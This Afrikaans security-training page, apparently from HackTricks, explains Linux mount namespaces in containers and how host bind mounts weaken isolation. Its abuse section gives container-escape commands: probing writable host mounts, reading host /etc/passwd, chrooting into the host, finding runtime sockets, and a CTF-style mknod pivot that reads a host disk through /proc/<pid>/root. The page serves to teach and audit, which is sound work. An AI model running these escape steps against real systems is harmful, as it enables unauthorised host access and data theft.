# Mount-naamruimte

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die mount-naamruimte beheer die **mount-tabel** wat 'n proses sien. Dit is een van die belangrikste container-isolasie-eienskappe omdat die root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure, en baie runtime-spesifieke hulp-mounts almal deur daardie mount-tabel uitgedruk word. Twee prosesse kan beide toegang hê tot `/`, `/proc`, `/sys`, of `/tmp`, maar waarna daardie paaie verwys hang af van die mount-naamruimte waarin hulle is.

Vanuit 'n container-sekuriteits-perspektief is die mount-naamruimte dikwels die verskil tussen "this is a neatly prepared application filesystem" en "this process can directly see or influence the host filesystem". Daarom draai bind mounts, `hostPath` volumes, privileged mount operations, en skryfbare `/proc` of `/sys`-eksponering alles om hierdie naamruimte.

## Werking

Wanneer 'n runtime 'n container begin, skep dit gewoonlik 'n vars mount-naamruimte, berei 'n root filesystem vir die container voor, mount procfs en ander hulp-lêerstelsels soos nodig, en voeg dan opsioneel bind mounts, tmpfs mounts, secrets, config maps, of host paths by. Sodra daardie proses binne die naamruimte loop, is die stel mounts wat dit sien grootliks ontkoppel van die host se standaard-uitsig. Die host mag steeds die werklike onderliggende lêerstelsel sien, maar die container sien die weergawe wat deur die runtime vir dit saamgestel is.

Dit is kragtig omdat dit die container laat glo dit het sy eie root filesystem al bestuur die host steeds alles. Dit is ook gevaarlik omdat as die runtime die verkeerde mount blootstel, die proses skielik sigbaarheid in host-hulpbronne kry wat die res van die sekuriteitsmodel dalk nie ontwerp is om te beskerm nie.

## Laboratorium

Jy kan 'n private mount-naamruimte skep met:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
As jy 'n ander shell buite daardie namespace open en die mount table inspekteer, sal jy sien dat die tmpfs mount slegs binne die isolated mount namespace bestaan. Dit is 'n nuttige oefening omdat dit wys dat mount isolation nie 'n abstrakte teorie is nie; die kernel bied letterlik 'n ander mount table aan die process.

As jy 'n ander shell buite daardie namespace open en die mount table inspekteer, sal die tmpfs mount slegs binne die isolated mount namespace bestaan.

Binne containers, 'n vinnige vergelyking is:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Die tweede voorbeeld demonstreer hoe maklik dit is vir ’n runtime configuration om ’n groot gaping deur die filesystem-grens te slaan.

## Uitvoertydgebruik

Docker, Podman, containerd-based stacks, en CRI-O vertrou almal op ’n private mount namespace vir normale containers. Kubernetes bou bo-op dieselfde meganisme vir volumes, projected secrets, config maps, en `hostPath` mounts. Incus/LXC omgewings vertrou ook swaar op mount namespaces, veral omdat system containers dikwels ryker en meer masjien-agtige filesystems eksponeer as application containers.

Dit beteken dat wanneer jy ’n container filesystem-probleem dophou, jy gewoonlik nie na ’n geïsoleerde Docker-kwessie kyk nie. Jy kyk na ’n mount-namespace en runtime-configuration probleem wat deur watter platform ookal wat die workload gelanseer het, uitgedruk word.

## Miskonfigurasies

Die mees voor die hand liggende en gevaarlike fout is om die host root filesystem of ’n ander sensitiewe host-pad bloot te stel deur ’n bind mount, byvoorbeeld `-v /:/host` of ’n skryfbare `hostPath` in Kubernetes. Op daardie punt is die vraag nie meer "kan die container op een of ander wyse ontsnap?" nie, maar eerder "hoeveel nuttige host-inhoud is reeds direk sigbaar en skryfbaar?" ’n Skryfbare host bind mount verander dikwels die res van die exploit in ’n eenvoudige saak van lêerplasing, chrooting, konfigurasie-wysiging, of runtime socket-ontdekking.

Nog ’n algemene probleem is om host `/proc` of `/sys` bloot te stel op maniere wat die veiliger container-kyk omseil. Hierdie filesystems is nie gewone data mounts nie; dit is koppelvlakke na kernel- en prosesstatus. As die workload direk toegang tot die host-weergawes kry, hou baie van die aannames agter container hardening op om skoon toe te pas.

Lees-alleen beskermings maak ook saak. ’n Lees-alleen root filesystem beveilig nie magies ’n container nie, maar dit verwyder ’n groot hoeveelheid aanvallers-stadiumspasie en maak persistence, helper-binary plasing, en konfigurasie-tampering moeiliker. Andersyds gee ’n skryfbare root of skryfbare host bind mount ’n aanvaller ruimte om die volgende stap voor te berei.

## Misbruik

Wanneer die mount namespace misbruik word, doen aanvallers gewoonlik een van vier dinge. Hulle **lees host data** wat buite die container moes gebly het. Hulle **wysig host-konfigurasie** deur skryfbare bind mounts. Hulle **mount of remount addisionele hulpbronne** as capabilities en seccomp dit toelaat. Of hulle **bereik kragtige sockets en runtime state directories** wat hulle toelaat om die container platform self vir meer toegang te vra.

As die container reeds die host filesystem kan sien, verander die res van die sekuriteitsmodel onmiddellik.

Wanneer jy ’n vermoede van ’n host bind mount het, bevestig eers wat beskikbaar is en of dit skryfbaar is:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
As die host root filesystem as read-write gemonteer is, is direkte host-toegang dikwels so eenvoudig soos:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
As die doel bevoorregte runtime-toegang eerder as direkte chrooting is, enumereer sockets en runtime-toestand:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
As `CAP_SYS_ADMIN` teenwoordig is, toets ook of nuwe mounts van binne die container geskep kan word:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Volledige voorbeeld: Two-Shell `mknod` Pivot

'n Meer gespesialiseerde misbruikpad verskyn wanneer die container root user bloktoestelle kan skep, die host en die container 'n gebruikersidentiteit op 'n bruikbare manier deel, en die aanvaller reeds 'n lae-privilege vastrapplek op die host het. In daardie situasie kan die container 'n toestelnode soos `/dev/sda` skep, en die lae-privilege host gebruiker kan dit later deur `/proc/<pid>/root/` lees vir die ooreenstemmende container-proses.

Inside the container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Vanaf die host, as die ooreenstemmende low-privilege user nadat jy die container shell PID gevind het:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Die belangrike les is nie die presiese CTF string-soektog nie. Dit is dat mount-namespace blootstelling deur `/proc/<pid>/root/` 'n host-gebruiker kan toelaat om container-created device nodes te hergebruik, selfs wanneer cgroup device-beleid direkte gebruik binne die container self verhinder het.

## Kontroles

Hierdie opdragte is bedoel om jou die filesystem-uitsig te wys waarin die huidige proses eintlik leef. Die doel is om host-afgeleide mounts, skryfbare sensitiewe paaie, en enigiets wat breër lyk as 'n normale application container root filesystem, op te spoor.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
- Bind mounts vanaf die host, veral `/`, `/proc`, `/sys`, runtime state directories, of socket locations, behoort onmiddellik op te val.
- Onverwagte read-write mounts is gewoonlik meer belangrik as 'n groot aantal read-only helper mounts.
- `mountinfo` is dikwels die beste plek om te bepaal of 'n pad regtig host-derived of overlay-backed is.

Hierdie kontroles bepaal **watter hulpbronne in hierdie namespace sigbaar is**, **watter daarvan host-derived is**, en **watter van hulle writable of security-sensitive is**.
{{#include ../../../../../banners/hacktricks-training.md}}
